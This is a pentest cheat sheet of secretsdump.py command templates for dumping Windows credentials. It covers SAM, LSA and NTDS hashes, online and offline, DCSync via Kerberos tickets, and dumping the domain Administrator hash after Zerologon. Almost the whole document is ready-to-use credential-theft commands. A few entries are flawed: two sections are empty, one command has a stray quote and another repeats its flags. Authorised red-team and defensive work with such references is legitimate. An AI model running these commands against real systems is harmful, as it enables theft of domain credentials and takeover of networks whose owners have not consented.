# secretsdump (imp)

% impacket-secrets, windows, smb, 445

## auth - account
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py '<domain_FQDN>/<user>:<password>'@<target_name>
```

## auth - hash
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -hashes <lm_hash>:<nt_hash> '<domain_FQDN>/<user>@<target_name>'
```

## auth - kerberos
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
```

## SAM - online
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 

## SAM - offline
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -system <SYSTEM_FILE|system.save> -sam <SAM_FILE|sam.save> LOCAL
```

## LSA - online
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 

## LSA - offline
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|security.save>' LOCAL
```

## NTDS - online (NTLM + keys)
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
```

## NTDS - online (only NTLM)
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc-ntlm -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
```

## NTDS - online account (only NTLM)
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc-user <domain_fqdn>/<name|krbtgt> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
```


## NTDS - offline
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save> LOCAL -outputfile <ntlm-extract-file>
```


## anonymous get administrator 
zerologon
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py <domain_fqdn>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## DCSYNC - online (ptt)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain_fqdn>/<user>'@<dc_fqdn>
```